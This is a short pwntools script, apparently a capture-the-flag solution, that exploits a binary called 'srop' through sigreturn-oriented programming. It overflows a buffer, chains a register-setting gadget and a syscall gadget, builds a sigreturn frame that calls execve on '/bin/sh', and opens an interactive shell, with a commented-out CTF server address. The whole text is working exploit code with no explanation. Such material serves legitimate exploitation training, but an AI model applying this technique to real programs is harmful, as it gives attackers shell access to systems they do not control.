from pwn import *

LOCATION_OF_BINARY = "./_ctfd/files/srop"
PROGNAME = (LOCATION_OF_BINARY)
REMOTE = "0.0.0.0" # "srop.ctf.secso.cc" 
REMOTEPORT = 1337 # 5001 

context.arch = "i386"
p = process(PROGNAME)
# p = remote(REMOTE, REMOTEPORT)
e = ELF(PROGNAME)

eax = 0x08048513
syscall = 0x08048519
execve = constants.SYS_execve
binsh = next(e.search(b"/bin/sh"))

frame = SigreturnFrame(kernel="amd64")
frame.eax = execve
frame.ebx = binsh
frame.eip = syscall

payload = b"A" * 16
payload += p32(eax)
payload += p32(syscall)
payload += bytes(frame)

p.sendline(payload)
p.interactive()


